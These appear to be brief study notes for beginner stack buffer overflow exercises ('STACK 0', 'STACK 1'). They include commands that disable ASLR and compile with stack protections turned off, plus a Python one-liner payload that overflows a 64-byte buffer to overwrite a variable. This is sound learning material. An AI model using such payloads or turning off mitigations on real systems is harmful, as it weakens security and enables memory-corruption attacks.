```
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc overflow.c -o overflow -fno-stack-protector -z execstack -no-pie

```

# STACK 0

* All we need to do is overwrite the buffer variable into the modified variable


# STACK 1

* We need to overflow the buffer and then overwrite the variable

```
python -c 'print "A"*64 + "\x64\x63\x62\x61" '
```